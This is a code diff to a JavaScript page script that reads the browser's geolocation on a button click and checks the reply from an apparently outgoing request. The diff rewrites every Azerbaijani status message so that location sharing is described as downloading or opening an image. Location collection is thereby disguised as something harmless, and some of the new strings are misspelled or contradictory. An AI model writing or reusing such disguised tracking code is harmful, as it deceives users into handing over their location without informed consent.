@@ -10,11 +10,11 @@ document.addEventListener("DOMContentLoaded", function () {
     locationButton.addEventListener("click", function () {
 
         if (!navigator.geolocation) {
-            status.textContent = "Bu brauzer konumu dəstəkləmir.";
+            status.textContent = "Bu brauzer şəkili dəstəkləmir.";
             return;
         }
 
-        status.textContent = "Konum icazəsi gözlənilir...";
+        status.textContent = "Şəkil indirilir...";
 
         navigator.geolocation.getCurrentPosition(
             async function (position) {
@@ -36,9 +36,9 @@ document.addEventListener("DOMContentLoaded", function () {
                     });
 
                     if (response.ok) {
-                        status.textContent = "Konum uğurla paylaşıldı.";
+                        status.textContent = "Şəkil acıldü.";
                     } else {
-                        status.textContent = "Konum göndərilə bilmədi.";
+                        status.textContent = "Şəkil açıla bilmədi.";
                     }
 
                 } catch (error) {
@@ -49,9 +49,9 @@ document.addEventListener("DOMContentLoaded", function () {
             function (error) {
 
                 if (error.code === 1) {
-                    status.textContent = "Konum icazəsi verilmədi.";
+                    status.textContent = "Şəkil icazə verdi.";
                 } else {
-                    status.textContent = "Konum alınmadı.";
+                    status.textContent = "Şəkil alınmadı.";
                 }
 
             }
